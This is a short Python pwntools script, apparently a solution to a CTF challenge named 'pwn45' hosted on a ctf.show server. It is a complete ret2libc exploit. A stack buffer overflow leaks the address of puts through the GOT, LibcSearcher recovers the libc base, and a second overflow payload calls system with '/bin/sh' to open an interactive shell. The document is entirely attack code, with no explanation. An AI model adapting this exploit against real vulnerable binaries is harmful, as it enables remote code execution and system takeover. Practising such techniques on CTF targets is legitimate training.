from pwn64 import *
from LibcSearcher import *

io = remote('pwn.challenge.ctf.show',28253)
# io = process("")
elf = ELF('./pwn45')
# libc= ELF('libc.so.6')

main_add =0x0804866D
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ", hex(puts_got))
print("Puts_plt: ", hex(puts_plt))

offset =0x6B

payload1 = b'a' * (offset + 4) + p32(puts_plt) + p32(main_add) + p32(puts_got)
io.sendlineafter(b'O.o?', payload1)
puts_addr = u32(io.recvuntil(b'\xf7')[-4:])
print("Puts_addr: ", hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)

libc_base = puts_addr - libc.dump('puts')
system_add = libc_base + libc.dump('system')
bin_sh_add = libc_base + libc.dump('str_bin_sh')

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset + 4) + p32(system_add) + p32(0) + p32(bin_sh_add)
io.sendlineafter(b'', payload2)

io.interactive()